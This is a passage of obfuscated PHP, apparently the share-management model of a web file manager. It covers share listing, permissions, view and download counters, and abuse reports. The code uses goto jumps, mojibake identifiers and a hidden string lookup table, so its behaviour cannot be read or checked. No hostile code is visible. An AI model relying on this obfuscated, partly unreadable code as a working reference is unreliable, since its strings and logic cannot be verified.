$this->where($dùÀ¿ºÓÈô)->find(); if (!$Aì‡»ÃÉ°–) { return !1; } goto cÀ‹ø‘Çƒ; a¶ßƒ¥…ğŞ: } protected function getInfoAuth($D¡Í…ó–…É) { $cË‰ÖÒØƒ =& $_SERVER[¼]; $DöíÃåèÃÃ = $this->getInfo($D¡Í…ó–…É); $DöíÃåèÃÃ[$cË‰ÖÒØƒ[373]] = Model($cË‰ÖÒØƒ[450])->authMake($DöíÃåèÃÃ[$cË‰ÖÒØƒ[2177]]); return $DöíÃåèÃÃ; } protected function listData($c‚‚áòÕôÓ = null, $EÕ¯º×ƒÙ = 300) { $dÌ¹ª–ÓøÛ =& $_SERVER[¼]; $E…™°Óø² = array(array($dÌ¹ª–ÓøÛ[442] => array($dÌ¹ª–ÓøÛ[921], 0), $dÌ¹ª–ÓøÛ[444] => array($dÌ¹ª–ÓøÛ[921], 0), $dÌ¹ª–ÓøÛ[2178] => $dÌ¹ª–ÓøÛ[2147])); if ($c‚‚áòÕôÓ == $dÌ¹ª–ÓøÛ[1834]) { $E…™°Óø² = array($dÌ¹ª–ÓøÛ[442] => 1); } else { if ($c‚‚áòÕôÓ == $dÌ¹ª–ÓøÛ[1000]) { $E…™°Óø² = array($dÌ¹ª–ÓøÛ[444] => 1); } } $E…™°Óø²[$dÌ¹ª–ÓøÛ[1404]] = USER_ID; $b¢Œ¸×›…İ = $this->where($E…™°Óø²)->selectPage($EÕ¯º×ƒÙ); return $b¢Œ¸×›…İ; } protected function listToMe($B›´»ÔØ—á = 300) { goto CÅ‰›ÂåÔÇ; e¡©Æš¼ƒÆ: $c¹ÕÔáĞÅš = array_to_keyvalue_group($dºÔ­–Í [$f›ÛÌóé›[351]], $f›ÛÌóé›[437]); if (!$c¹ÕÔáĞÅš) { return $dºÔ­–Í ; } $F¢¥ŒÑ²Éˆ = $f›ÛÌóé›[2180]; goto böğ¯´‹ˆÛ; aó¾œ¨ËÚé: $f×ÕğÉÆõ = array($f›ÛÌóé›[2181] => $d’‹›Û‰Ä‹, $f›ÛÌóé›[2182] => $dºÔ­–Í [$f›ÛÌóé›[348]]); return $f×ÕğÉÆõ; goto c®ÃË²¹Ãâ; CÅ‰›ÂåÔÇ: $f›ÛÌóé› =& $_SERVER[¼]; $D¸ÆÄ¾¦åÕ = Session::get($f›ÛÌóé›[2179]); $C¦Í“°â– = array_to_keyvalue($D¸ÆÄ¾¦åÕ, $f›ÛÌóé›[33], $f›ÛÌóé›[2067]); goto eİö“è©è; böğ¯´‹ˆÛ: $BÒõÙÜêìÕ = array($f›ÛÌóé›[437] => array($f›ÛÌóé›[381], array_keys($c¹ÕÔáĞÅš))); $d’‹›Û‰Ä‹ = $this->field($F¢¥ŒÑ²Éˆ)->where($BÒõÙÜêìÕ)->select(); foreach ($d’‹›Û‰Ä‹ as $c¦¢®¬ª => &$bÉÒ”î„—) { $bÉÒ”î„—[$f›ÛÌóé›[2177]] = $c¹ÕÔáĞÅš[$bÉÒ”î„—[$f›ÛÌóé›[437]]]; } goto aó¾œ¨ËÚé; eİö“è©è: $BÒõÙÜêìÕ = array($f›ÛÌóé›[517] => SourceModel::TYPE_USER, $f›ÛÌóé›[452] => USER_ID); if ($C¦Í“°â–) { $BÒõÙÜêìÕ = array(array($f›ÛÌóé›[517] => SourceModel::TYPE_USER, $f›ÛÌóé›[452] => USER_ID), array($f›ÛÌóé›[517] => SourceModel::TYPE_GROUP, $f›ÛÌóé›[452] => array($f›ÛÌóé›[7], $C¦Í“°â–)), $f›ÛÌóé›[2178] => $f›ÛÌóé›[2147]); } $dºÔ­–Í  = Model($f›ÛÌóé›[533])->where($BÒõÙÜêìÕ)->selectPage($B›´»ÔØ—á); goto e¡©Æš¼ƒÆ; c®ÃË²¹Ãâ: } protected function shareAdd($CÄà‹¬’·ñ, $Cí¨Ú‘÷©´) { $EÍîœ¡òôİ =& $_SERVER[¼]; $bëÑ’ŒÊœô = $this->_addShareData($CÄà‹¬’·ñ, $Cí¨Ú‘÷©´); if (!empty($Cí¨Ú‘÷©´[$EÍîœ¡òôİ[2183]])) { $this->_shareAuthSet($bëÑ’ŒÊœô, $Cí¨Ú‘÷©´[$EÍîœ¡òôİ[2183]]); } $this->shareEventAdd($CÄà‹¬’·ñ, $Cí¨Ú‘÷©´, $EÍîœ¡òôİ[1003]); return $bëÑ’ŒÊœô; } private function shareEventAdd($BâŠ”ĞªŸÔ, $B¸ğø™›îÇ, $b°†¤Üó“í = "\x61\x64\x64") { goto dÅ¯Úë÷‚¾; CÜÖƒ×À¾ƒ: $F‚ìŞÜİ”é = $A¸œç’Œ[2186]; if ($cÏå®¸ñ[$A¸œç’Œ[442]] == $A¸œç’Œ[464] && $B¸ğø™›îÇ[$A¸œç’Œ[442]] == $A¸œç’Œ[83]) { $F‚ìŞÜİ”é = $A¸œç’Œ[2184]; } if ($cÏå®¸ñ[$A¸œç’Œ[442]] == $A¸œç’Œ[83] && $B¸ğø™›îÇ[$A¸œç’Œ[442]] == $A¸œç’Œ[464]) { $F‚ìŞÜİ”é = $A¸œç’Œ[2187]; } goto d·ïæ—»°ø; d·ïæ—»°ø: if ($cÏå®¸ñ[$A¸œç’Œ[444]] == $A¸œç’Œ[464] && $B¸ğø™›îÇ[$A¸œç’Œ[444]] == $A¸œç’Œ[83]) { $F‚ìŞÜİ”é = $A¸œç’Œ[2185]; } if ($cÏå®¸ñ[$A¸œç’Œ[444]] == $A¸œç’Œ[83] && $B¸ğø™›îÇ[$A¸œç’Œ[444]] == $A¸œç’Œ[464]) { $F‚ìŞÜİ”é = $A¸œç’Œ[2188]; } Model($A¸œç’Œ[501])->eventShare($BâŠ”ĞªŸÔ, $F‚ìŞÜİ”é); goto bÁÒ„Ü»²§; dÅ¯Úë÷‚¾: $A¸œç’Œ =& $_SERVER[¼]; if ($b°†¤Üó“í == $A¸œç’Œ[1003]) { if ($B¸ğø™›îÇ[$A¸œç’Œ[442]] == $A¸œç’Œ[83]) { Model($A¸œç’Œ[501])->eventShare($BâŠ”ĞªŸÔ, $A¸œç’Œ[2184]); } if ($B¸ğø™›îÇ[$A¸œç’Œ[444]] == $A¸œç’Œ[83]) { Model($A¸œç’Œ[501])->eventShare($BâŠ”ĞªŸÔ, $A¸œç’Œ[2185]); } return; } $cÏå®¸ñ = $this->getInfoByPath($BâŠ”ĞªŸÔ); goto CÜÖƒ×À¾ƒ; bÁÒ„Ü»²§: return; goto D³ŠËÓœ©; D³ŠËÓœ©: } private function _addShareData($E»­¼…©á‡, $aéƒäŞÛ‘ = array()) { goto Cöì©ãƒîó; bï¼…îğ•: return $AÑ“éƒ©”; goto FøÑö™¦­²; dŠî«‘°Çì: if ($dĞÙ©¿¡½ = $this->where($A—³¤ŠÙ)->find()) { return $dĞÙ©¿¡½[$a¬¦›‘ì[437]]; } if ($E»­¼…©á‡ == 0) { $f¦êÊšÉ·Â = array($a¬¦›‘ì[28] => get_path_this($aéƒäŞÛ‘[$a¬¦›‘ì[75]])); } else { $f¦êÊšÉ·Â = Model($a¬¦›‘ì[744])->sourceInfo($E»­¼…©á‡); if (!$f¦êÊšÉ·Â) { return !1; } } if (!$aéƒäŞÛ‘[$a¬¦›‘ì[1312]]) { $aéƒäŞÛ‘[$a¬¦›‘ì[1312]] = $f¦êÊšÉ·Â[$a¬¦›‘ì[28]]; } goto bÊ÷õèéë¡; bÊ÷õèéë¡: $Fî¶ˆ³‚óÏ = array($a¬¦›‘ì[1395] => USER_ID, $a¬¦›‘ì[380] => $E»­¼…©á‡, $a¬¦›‘ì[1312] => $a¬¦›‘ì[33], $a¬¦›‘ì[442] => 0, $a¬¦›‘ì[444] => 0, $a¬¦›‘ì[1011] => $a¬¦›‘ì[33], $a¬¦›‘ì[292] => $a¬¦›‘ì[33], $a¬¦›‘ì[797] => $a¬¦›‘ì[33], $a¬¦›‘ì[2190] => 0, $a¬¦›‘ì[2191] => 0, $a¬¦›‘ì[695] => 0, $a¬¦›‘ì[2192] => $a¬¦›‘ì[33], $a¬¦›‘ì[439] => $a¬¦›‘ì[33]); $F½›á×È• = explode($a¬¦›‘ì[47], $a¬¦›‘ì[2193]); foreach ($F½›á×È• as $A‰ëæç•Ù°) { if (!isset($aéƒäŞÛ‘[$A‰ëæç•Ù°])) { continue; } $Fî¶ˆ³‚óÏ[$A‰ëæç•Ù°] = $aéƒäŞÛ‘[$A‰ëæç•Ù°]; } goto b¬¡­‚©£ï; b¬¡­‚©£ï: $AÑ“éƒ©” = $this->add($Fî¶ˆ³‚óÏ); $A¹àÆ½»¡Ô = array($a¬¦›‘ì[439] => short_id($AÑ“éƒ©”)); $this->where(array($a¬¦›‘ì[436] => $AÑ“éƒ©”))->save($A¹àÆ½»¡Ô); goto bï¼…îğ•; Cöì©ãƒîó: $a¬¦›‘ì =& $_SERVER[¼]; $A—³¤ŠÙ = array($a¬¦›‘ì[380] => $E»­¼…©á‡, $a¬¦›‘ì[1395] => USER_ID); if ($E»­¼…©á‡ == 0) { $A—³¤ŠÙ = array($a¬¦›‘ì[2189] => $aéƒäŞÛ‘[$a¬¦›‘ì[1011]], $a¬¦›‘ì[1395] => USER_ID); } goto dŠî«‘°Çì; FøÑö™¦­²: } private function _shareAuthSet($C«ÅìïÜÔ, $d›À·œ‹ĞŠ) { goto dÇ‘¶…Š—; dÇ‘¶…Š—: $eíØ¾„£ˆ =& $_SERVER[¼]; if (!is_array($d›À·œ‹ĞŠ)) { return !1; } $EãòêµÚÓë = Model($eíØ¾„£ˆ[2194]); goto BÈ‡æŒ®; BÈ‡æŒ®: $EãòêµÚÓë->where(array($eíØ¾„£ˆ[437] => $C«ÅìïÜÔ))->delete(); $EĞâ™ôêÓ = array(); foreach ($d›À·œ‹ĞŠ as $d‰¯Š¢Ì°Î) { $Dã£Û¶‚å = SourceModel::TYPE_USER; if ($d‰¯Š¢Ì°Î[$eíØ¾„£ˆ[368]] == SourceModel::TYPE_GROUP) { $Dã£Û¶‚å = SourceModel::TYPE_GROUP; } $D–ŸĞ‹÷“ = array($eíØ¾„£ˆ[437] => $C«ÅìïÜÔ, $eíØ¾„£ˆ[368] => $Dã£Û¶‚å, $eíØ¾„£ˆ[452] => intval($d‰¯Š¢Ì°Î[$eíØ¾„£ˆ[452]]), $eíØ¾„£ˆ[2195] => 0, $eíØ¾„£ˆ[2196] => -1); if ($d‰¯Š¢Ì°Î[$eíØ¾„£ˆ[2195]]) { $D–ŸĞ‹÷“[$eíØ¾„£ˆ[2195]] = $d‰¯Š¢Ì°Î[$eíØ¾„£ˆ[2195]]; } else { if ($d‰¯Š¢Ì°Î[$eíØ¾„£ˆ[2196]]) { $D–ŸĞ‹÷“[$eíØ¾„£ˆ[2196]] = $d‰¯Š¢Ì°Î[$eíØ¾„£ˆ[2196]]; } } $EĞâ™ôêÓ[] = $D–ŸĞ‹÷“; } goto F×‡Ç´ò©Ò; F×‡Ç´ò©Ò: return $EãòêµÚÓë->addAll($EĞâ™ôêÓ, array(), !0); goto CÌ­ô»öòÇ; CÌ­ô»öòÇ: } public function numViewAdd($F¶Í­¹ùÕ) { $Fô„ÛëÃÆ =& $_SERVER[¼]; $fõ¥ğ®§ÜÎ = array($Fô„ÛëÃÆ[436] => $F¶Í­¹ùÕ); $this->where($fõ¥ğ®§ÜÎ)->setAdd($Fô„ÛëÃÆ[2190]); } public function numDownloadAdd($Eäø§‘„Õ”) { $eô±Œˆ·…À =& $_SERVER[¼]; $AÖ†ï¿’ïä = array($eô±Œˆ·…À[436] => $Eäø§‘„Õ”); $this->where($AÖ†ï¿’ïä)->setAdd($eô±Œˆ·…À[2191]); } protected function shareEdit($A‡ŸñÜ”ç, $Cææ¥Ğ é™) { goto fğ‚¾ğî½ƒ; CøÊ®Ú¦é¼: foreach ($bÔ¹â…öò’ as $A‡´‹·å£) { if (!array_key_exists($A‡´‹·å£, $Cææ¥Ğ é™)) { continue; } $c’ªÈªËŠæ[$A‡´‹·å£] = $Cææ¥Ğ é™[$A‡´‹·å£]; } $this->shareEventAdd($aÔ ©ëæ¸ë[$A•‡éÀ†µ¿[366]], $Cææ¥Ğ é™, $A•‡éÀ†µ¿[2035]); $this->where(array($A•‡éÀ†µ¿[436] => $A‡ŸñÜ”ç))->save($c’ªÈªËŠæ); goto cÜ³¯ºäØ; fğ‚¾ğî½ƒ: $A•‡éÀ†µ¿ =& $_SERVER[¼]; $aÔ ©ëæ¸ë = $this->getInfo($A‡ŸñÜ”ç); if (!$aÔ ©ëæ¸ë) { return !1; } goto F²ˆ‡ÙŞ™¹; cÜ³¯ºäØ: if (isset($Cææ¥Ğ é™[$A•‡éÀ†µ¿[2183]])) { $this->_shareAuthSet($A‡ŸñÜ”ç, $Cææ¥Ğ é™[$A•‡éÀ†µ¿[2183]]); } return !0; goto a½Ï±İŠİ; F²ˆ‡ÙŞ™¹: $this->_checkLinkShare($Cææ¥Ğ é™, $aÔ ©ëæ¸ë); $c’ªÈªËŠæ = array(); $bÔ¹â…öò’ = explode($A•‡éÀ†µ¿[47], $A•‡éÀ†µ¿[2197]); goto CøÊ®Ú¦é¼; a½Ï±İŠİ: } private function _checkLinkShare($a×…‚ ¨à¿, $b¯•©î“ğÄ) { goto A»Ÿõò¥¯‘; cÑğíæä•ó: if ($b¯•©î“ğÄ[$B”ğÇŸå­„[388]][$B”ğÇŸå­„[29]] != $B”ğÇŸå­„[164]) { $cĞö³¨ƒ–¹ = $this->_folderReport($FøßãŠ¾Á†); if (!$cĞö³¨ƒ–¹) { return; } show_json(LNG($B”ğÇŸå­„[2198]) . $B”ğÇŸå­„[2199] . $cĞö³¨ƒ–¹, !1); } $cĞŸ‡À÷ø = Model($B”ğÇŸå­„[744])->fileInfoGet($b¯•©î“ğÄ[$B”ğÇŸå­„[388]][$B”ğÇŸå­„[366]]); if (!$cĞŸ‡À÷ø) { return; } goto EšƒÄØÆõ¶; EšƒÄØÆõ¶: $FŒ‘Üäã¬¢ = $this->shareFileMeta($cĞŸ‡À÷ø[$B”ğÇŸå­„[415]]); if (isset($FŒ‘Üäã¬¢[$B”ğÇŸå­„[356]]) && $FŒ‘Üäã¬¢[$B”ğÇŸå­„[356]] == $B”ğÇŸå­„[83]) { show_json(LNG($B”ğÇŸå­„[2200]), !1); } goto fÎè’È‚´ˆ; A»Ÿõò¥¯‘: $B”ğÇŸå­„ =& $_SERVER[¼]; if ($a×…‚ ¨à¿[$B”ğÇŸå­„[442]] != $B”ğÇŸå­„[83]) { return; } $FøßãŠ¾Á† = $b¯•©î“ğÄ[$B”ğÇŸå­„[388]][$B”ğÇŸå­„[366]]; goto cÑğíæä•ó; fÎè’È‚´ˆ: } private function _folderReport($Føâœ„ó¶Á) { goto A¶•Ì…†®; EƒÎó²œè: $BË®±„µŸ = substr($eßóèªˆ Ç[$EÖ¤‰ôÑö‡[455]], strpos($eßóèªˆ Ç[$EÖ¤‰ôÑö‡[455]], $EÌóÌ¦Öå)); $c«ºƒ‰¥æ = array($EÖ¤‰ôÑö‡[366] => array($EÖ¤‰ôÑö‡[7], trim($BË®±„µŸ, $EÖ¤‰ôÑö‡[47]))); $c‚œ»¬ğïÀ = Model($EÖ¤‰ôÑö‡[744])->where($c«ºƒ‰¥æ)->field($EÖ¤‰ôÑö‡[28])->select(); goto B†ß•´ºÏ‡; bËÜåÁÄŸ¼: if (!$E©š§‘º½Ò) { return !1; } $E©š§‘º½Ò = array_to_keyvalue($E©š§‘º½Ò, $EÖ¤‰ôÑö‡[33], $EÖ¤‰ôÑö‡[415]); $EÌóÌ¦Öå = $EÖ¤‰ôÑö‡[47] . $Føâœ„ó¶Á . $EÖ¤‰ôÑö‡[47]; goto d¿åˆò‡¡ì; B†ß•´ºÏ‡: $fé‚¢Î¹Ş = array_to_keyvalue($c‚œ»¬ğïÀ, $EÖ¤‰ôÑö‡[33], $EÖ¤‰ôÑö‡[28]); $fé‚¢Î¹Ş[] = $eßóèªˆ Ç[$EÖ¤‰ôÑö‡[28]]; return implode($EÖ¤‰ôÑö‡[8], $fé‚¢Î¹Ş); goto f÷›’¬ï; A¶•Ì…†®: $EÖ¤‰ôÑö‡ =& $_SERVER[¼]; $c«ºƒ‰¥æ = array($EÖ¤‰ôÑö‡[415] => array($EÖ¤‰ôÑö‡[921], 0), $EÖ¤‰ôÑö‡[681] => 3); $E©š§‘º½Ò = Model($EÖ¤‰ôÑö‡[2201])->where($c«ºƒ‰¥æ)->field($EÖ¤‰ôÑö‡[415])->select(); goto bËÜåÁÄŸ¼; d¿åˆò‡¡ì: $c«ºƒ‰¥æ = array($EÖ¤‰ôÑö‡[415] => array($EÖ¤‰ôÑö‡[7], $E©š§‘º½Ò), $EÖ¤‰ôÑö‡[455] => array($EÖ¤‰ôÑö‡[743], "\x25{$EÌóÌ¦Öå}\x25"), $EÖ¤‰ôÑö‡[393] => 0); $eßóèªˆ Ç = Model($EÖ¤‰ôÑö‡[744])->where($c«ºƒ‰¥æ)->field($EÖ¤‰ôÑö‡[2202])->find(); if (!$eßóèªˆ Ç) { return !1; } goto EƒÎó²œè; f÷›’¬ï: } protected function remove($EÅ˜‚±µÒ³) { goto dáÀ¤Ô•ˆ™; bâ¨™ö’Í: for ($EĞô‰˜ˆ¤â = 0; $EĞô‰˜ˆ¤â < count($fİ¤Û‚å„‹); $EĞô‰˜ˆ¤â++) { $dÅ»É×ÜÏ‚ = $this->getInfo($fİ¤Û‚å„‹[$EĞô‰˜ˆ¤â]); if ($dÅ»É×ÜÏ‚[$E®×éİÓåÍ[444]] == $E®×éİÓåÍ[83]) { Model($E®×éİÓåÍ[501])->eventShare($dÅ»É×ÜÏ‚[$E®×éİÓåÍ[366]], $E®×éİÓåÍ[2188]); } if ($dÅ»É×ÜÏ‚[$E®×éİÓåÍ[442]] == $E®×éİÓåÍ[83]) { Model($E®×éİÓåÍ[501])->eventShare($dÅ»É×ÜÏ‚[$E®×éİÓåÍ[366]], $E®×éİÓåÍ[2187]); } } return $E¬Û´ƒ“ğ‘; goto aæä‚‹óÖ; b¸×„Ì·à: $E¬Û´ƒ“ğ‘ = $this->where($dö˜ Ş„ù†)->delete(); if ($E¬Û´ƒ“ğ‘) { Model($E®×éİÓåÍ[533])->where(array($E®×éİÓåÍ[437] => $EÅ˜‚±µÒ³))->delete(); } $fİ¤Û‚å„‹ = is_array($EÅ˜‚±µÒ³) ? $EÅ˜‚±µÒ³[1] : array($EÅ˜‚±µÒ³); goto bâ¨™ö’Í; dáÀ¤Ô•ˆ™: $E®×éİÓåÍ =& $_SERVER[¼]; if (is_array($EÅ˜‚±µÒ³)) { $EÅ˜‚±µÒ³ = array($E®×éİÓåÍ[7], $EÅ˜‚±µÒ³); } $dö˜ Ş„ù† = array($E®×éİÓåÍ[437] => $EÅ˜‚±µÒ³); goto b¸×„Ì·à; aæä‚‹óÖ: } protected function removeBySource($Aœ¦Ô§Ò©) { goto B‹Ã²Äš; fé¥Ï·¥÷: $Cã¤®È˜Ú¿ = array_to_keyvalue($Cã¤®È˜Ú¿, $a÷˜é»‹Æª[33], $a÷˜é»‹Æª[437]); if (!$Cã¤®È˜Ú¿) { return; } $AßØ®Î’’ = array($a÷˜é»‹Æª[436] => array($a÷˜é»‹Æª[381], $Cã¤®È˜Ú¿)); goto c±šˆ†‚ˆ; c±šˆ†‚ˆ: $this->where($AßØ®Î’’)->delete(); Model($a÷˜é»‹Æª[533])->where($AßØ®Î’’)->delete(); goto eÏÒ÷Ù„Í; B‹Ã²Äš: $a÷˜é»‹Æª =& $_SERVER[¼]; $AßØ®Î’’ = array($a÷˜é»‹Æª[380] => array($a÷˜é»‹Æª[381], $Aœ¦Ô§Ò©)); $Cã¤®È˜Ú¿ = $this->field($a÷˜é»‹Æª[437])->where($AßØ®Î’’)->select(); goto fé¥Ï·¥÷; eÏÒ÷Ù„Í: } public function listAll($FµŒ…®Çˆó) { goto F‹‰öøÛ¬¼; D™ ¤ö¸³Û: return $BÖõœêÈ­²; goto Eó¿¸‹Œò•; BÔ‰áŒÃ÷: if ($FµŒ…®Çˆó[$c‚ä´“‰İ[694]]) { $då„‘ °¡Ì = $FµŒ…®Çˆó[$c‚ä´“‰İ[695]] ? $FµŒ…®Çˆó[$c‚ä´“‰İ[695]] : strtotime(date($c‚ä´“‰İ[2203])); $c¢ÍõÈÔ¾[$c‚ä´“‰İ[184]] = array($c‚ä´“‰İ[318], array($FµŒ…®Çˆó[$c‚ä´“‰İ[694]], $då„‘ °¡Ì)); } if ($FµŒ…®Çˆó[$c‚ä´“‰İ[29]]) { $c¢ÍõÈÔ¾[$FµŒ…®Çˆó[$c‚ä´“‰İ[29]]] = 1; } else { $c¢ÍõÈÔ¾[] = array($c‚ä´“‰İ[442] => array($c‚ä´“‰İ[921], 0), $c‚ä´“‰İ[444] => array($c‚ä´“‰İ[921], 0), $c‚ä´“‰İ[2178] => $c‚ä´“‰İ[2147]); } if ($FµŒ…®Çˆó[$c‚ä´“‰İ[2143]]) { $c¢ÍõÈÔ¾[] = array($c‚ä´“‰İ[439] => $FµŒ…®Çˆó[$c‚ä´“‰İ[2143]], $c‚ä´“‰İ[1312] => array($c‚ä´“‰İ[743], "\45{$FµŒ…®Çˆó[$c‚ä´“‰İ[2143]]}\x25"), $c‚ä´“‰İ[2178] => $c‚ä´“‰İ[2147]); } goto Bõ¢ÇøíÆ; F‹‰öøÛ¬¼: $c‚ä´“‰İ =& $_SERVER[¼]; $c¢ÍõÈÔ¾ = array(); if ($FµŒ…®Çˆó[$c‚ä´“‰İ[1404]]) { $c¢ÍõÈÔ¾[$c‚ä´“‰İ[1404]] = $FµŒ…®Çˆó[$c‚ä´“‰İ[1404]]; } goto BÔ‰áŒÃ÷; Bõ¢ÇøíÆ: $BÖõœêÈ­² = $this->_makeOrder()->where($c¢ÍõÈÔ¾)->selectPage(20); if (empty($BÖõœêÈ­²[$c‚ä´“‰İ[351]])) { return array(); } $this->_listDataApply($BÖõœêÈ­²[$c‚ä´“‰İ[351]]); goto D™ ¤ö¸³Û; Eó¿¸‹Œò•: } public function listDataApply($fï¨®Èó‰) { $this->_listDataApply($fï¨®Èó‰); return $fï¨®Èó‰; } private function _listDataApply(&$f‚ó¶Š™ì) { $eµÉ´ô¦ğè =& $_SERVER[¼]; $B¢Ì¨ùº” = array_to_keyvalue($f‚ó¶Š™ì, $eµÉ´ô¦ğè[33], $eµÉ´ô¦ğè[1404]); $CÊá‹‘µæ² = Model($eµÉ´ô¦ğè[473])->userListInfo(array_unique($B¢Ì¨ùº”)); $dğéÆÃÍ‹ë = array_to_keyvalue($f‚ó¶Š™ì, $eµÉ´ô¦ğè[33], $eµÉ´ô¦ğè[366]); $FÜ‡µ•å° = Model($eµÉ´ô¦ğè[744])->sourceListInfo($dğéÆÃÍ‹ë, !0); foreach ($f‚ó¶Š™ì as &$A ä‹Ó–Ä) { $CÉÕ£ğÏ¤ = $A ä‹Ó–Ä[$eµÉ´ô¦ğè[1404]]; $A ä‹Ó–Ä[$eµÉ´ô¦ğè[2204]] = $CÊá‹‘µæ²[$CÉÕ£ğÏ¤] ? $CÊá‹‘µæ²[$CÉÕ£ğÏ¤] : !1; $a—ÕÎ¼ñˆ¯ = $A ä‹Ó–Ä[$eµÉ´ô¦ğè[366]]; $A ä‹Ó–Ä[$eµÉ´ô¦ğè[388]] = $FÜ‡µ•å°[$a—ÕÎ¼ñˆ¯] ? $FÜ‡µ•å°[$a—ÕÎ¼ñˆ¯] : !1; } } private function _makeOrder($C ´‰–æ = '') { goto A¦¤ãÌô¤; bÆ×¿†æ‹ö: $c°´™¬ßÚ¸ = Input::get($EÚ ª‘ª[403], $EÚ ª‘ª[7], $EÚ ª‘ª[386], $b‰É…“¤); $d‰¸ÖŸéÈã = Input::get($EÚ ª‘ª[404], $EÚ ª‘ª[7], $EÚ ª‘ª[2205], array($EÚ ª‘ª[2142], $EÚ ª‘ª[400])); $d‰¸ÖŸéÈã = $d»Ø§‘ì¹[$d‰¸ÖŸéÈã]; goto c‚¢˜éŞŒá; c‚¢˜éŞŒá: $C ´‰–æ = $C ´‰–æ . "{$c°´™¬ßÚ¸}\40{$d‰¸ÖŸéÈã}"; return $this->order($C ´‰–æ); goto b°ŞÒÏãÜ; A¦¤ãÌô¤: $EÚ ª‘ª =& $_SERVER[¼]; $b‰É…“¤ = array($EÚ ª‘ª[184], $EÚ ª‘ª[695], $EÚ ª‘ª[2190], $EÚ ª‘ª[2191]); $d»Ø§‘ì¹ = array($EÚ ª‘ª[398] => $EÚ ª‘ª[399], $EÚ ª‘ª[400] => $EÚ ª‘ª[401]); goto bÆ×¿†æ‹ö; b°ŞÒÏãÜ: } public function reportAdd($bšåïøÚ) { $Eˆ¶ŞâùÚª =& $_SERVER[¼]; $aœ¸ùŠÏõà = array($Eˆ¶ŞâùÚª[437] => $bšåïøÚ[$Eˆ¶ŞâùÚª[437]], $Eˆ¶ŞâùÚª[1404] => USER_ID); if (Model($Eˆ¶ŞâùÚª[2201])->where($aœ¸ùŠÏõà)->find()) { return !1; } $C” ºÄëõÜ = array($Eˆ¶ŞâùÚª[437] => $bšåïøÚ[$Eˆ¶ŞâùÚª[437]], $Eˆ¶ŞâùÚª[1312] => $bšåïøÚ[$Eˆ¶ŞâùÚª[1312]], $Eˆ¶ŞâùÚª[366] => $bšåïøÚ[$Eˆ¶ŞâùÚª[366]], $Eˆ¶ŞâùÚª[415] => $bšåïøÚ[$Eˆ¶ŞâùÚª[415]], $Eˆ¶ŞâùÚª[1404] => USER_ID, $Eˆ¶ŞâùÚª[29] => $bšåïøÚ[$Eˆ¶ŞâùÚª[29]], $Eˆ¶ŞâùÚª[401] => $bšåïøÚ[$Eˆ¶ŞâùÚª[401]]); return Model($Eˆ¶ŞâùÚª[2201])->add($C” ºÄëõÜ); } public function reportList($B¨«”©ÖˆÇ) { goto e÷¡ØÑæß; a ºîÛÃ“: $A¶‹ÜÉèïÓ = array($cññĞŸ‚ò[398] => $cññĞŸ‚ò[399], $cññĞŸ‚ò[400] => $cññĞŸ‚ò[401]); $f±Ø‘×ÚÂ» = $cññĞŸ‚ò[2209] . $A¶‹ÜÉèïÓ[$E´‘»ÙÕ™Å]; $CŒïÀ¦ÀŒƒ = Model($cññĞŸ‚ò[2201])->where($FÊã¹æîƒË)->order($f±Ø‘×ÚÂ»)->selectPage(20); goto E²’Ò°—µ; e÷¡ØÑæß: $cññĞŸ‚ò =& $_SERVER[¼]; $FÊã¹æîƒË = array(); if ($B¨«”©ÖˆÇ[$cññĞŸ‚ò[694]]) { $aÛ—åÑ‘” = $B¨«”©ÖˆÇ[$cññĞŸ‚ò[695]] ? $B¨«”©ÖˆÇ[$cññĞŸ‚ò[695]] : strtotime(date($cññĞŸ‚ò[2203])); $FÊã¹æîƒË[$cññĞŸ‚ò[184]] = array($cññĞŸ‚ò[318], array($B¨«”©ÖˆÇ[$cññĞŸ‚ò[694]], $aÛ—åÑ‘”)); } goto F‰ëÇÚ–†ƒ; F‰ëÇÚ–†ƒ: if (isset($B¨«”©ÖˆÇ[$cññĞŸ‚ò[29]]) && in_array($B¨«”©ÖˆÇ[$cññĞŸ‚ò[29]], array($cññĞŸ‚ò[83], $cññĞŸ‚ò[2206], $cññĞŸ‚ò[2207], $cññĞŸ‚ò[2208], $cññĞŸ‚ò[1883]))) { $FÊã¹æîƒË[$cññĞŸ‚ò[29]] = $B¨«”©ÖˆÇ[$cññĞŸ‚ò[29]]; } if (isset($B¨«”©ÖˆÇ[$cññĞŸ‚ò[681]]) && in_array($B¨«”©ÖˆÇ[$cññĞŸ‚ò[681]], array($cññĞŸ‚ò[464], $cññĞŸ‚ò[83], $cññĞŸ‚ò[2206], $cññĞŸ‚ò[2207]))) { $FÊã¹æîƒË[$cññĞŸ‚ò[681]] = $B¨«”©ÖˆÇ[$cññĞŸ‚ò[681]]; } $E´‘»ÙÕ™Å = Input::get($cññĞŸ‚ò[404], $cññĞŸ‚ò[7], $cññĞŸ‚ò[2205], array($cññĞŸ‚ò[2142], $cññĞŸ‚ò[400])); goto a ºîÛÃ“; E²’Ò°—µ: if (empty($CŒïÀ¦ÀŒƒ[$cññĞŸ‚ò[351]])) { return array(); } $this->_listDataApply($CŒïÀ¦ÀŒƒ[$cññĞŸ‚ò[351]]); return $CŒïÀ¦ÀŒƒ; goto C¶…¨Æ’õ·; C¶…¨Æ’õ·: } public function reportStatus($dÙÇäéº½Ñ) { goto B«±Çê£õ; dÚğÂÙˆ…›: $d¦å×êŞî† = Model($cé§µ¯Šö¤[2201])->where($BĞÛÊÏ¾Ëì)->save($F»Îô­ì¡‹); if ($dÙÇäéº½Ñ[$cé§µ¯Šö¤[681]] == $cé§µ¯Šö¤[2206]) { if ($A©æ„‘Ï‹à[$cé§µ¯Šö¤[415]] != $cé§µ¯Šö¤[464] && $this->shareFileMeta($A©æ„‘Ï‹à[$cé§µ¯Šö¤[415]])) { $this->shareFileMeta($A©æ„‘Ï‹à[$cé§µ¯Šö¤[415]], 0); } return $this->remove($A©æ„‘Ï‹à[$cé§µ¯Šö¤[437]]); } if ($d¦å×êŞî† && $dÙÇäéº½Ñ[$cé§µ¯Šö¤[681]] == $cé§µ¯Šö¤[2207]) { $C‘˜¿‘µè— = $F»Îô­ì¡‹[$cé§µ¯Šö¤[681]] == $cé§µ¯Šö¤[2207] ? 1 : 0; $this->shareFileMeta($A©æ„‘Ï‹à[$cé§µ¯Šö¤[415]], $C‘˜¿‘µè—); $this->removeByFile($A©æ„‘Ï‹à[$cé§µ¯Šö¤[415]]); } goto Bï•­Éíä•; fñœ Î‹Ø·: if (!$A©æ„‘Ï‹à) { return !1; } $F»Îô­ì¡‹ = array($cé§µ¯Šö¤[681] => $dÙÇäéº½Ñ[$cé§µ¯Šö¤[681]]); if 